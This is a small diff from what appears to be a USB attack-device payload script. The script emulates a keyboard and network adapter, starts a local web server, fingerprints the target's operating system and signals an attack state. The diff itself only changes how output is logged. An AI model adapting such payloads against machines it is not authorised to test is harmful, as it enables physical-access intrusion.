@@ -4,8 +4,7 @@ echo 'Payload Started' >> /root/udisk/payloads/$SWITCH_POSITION/payload.log
 ATTACKMODE HID AUTO_ETHERNET
 LED B
 sleep 5
-python -m SimpleHTTPServer > /root/udisk/payloads/$SWITCH_POSITION/payload.log 2>&1 &
-echo 'Web Server Started' >> /root/udisk/payloads/$SWITCH_POSITION/payload.log
+python -m SimpleHTTPServer >> /root/udisk/payloads/$SWITCH_POSITION/payload.log 2>&1 &
 GET TARGET_OS
 echo $TARGET_OS >> /root/udisk/payloads/$SWITCH_POSITION/payload.log
 LED ATTACK
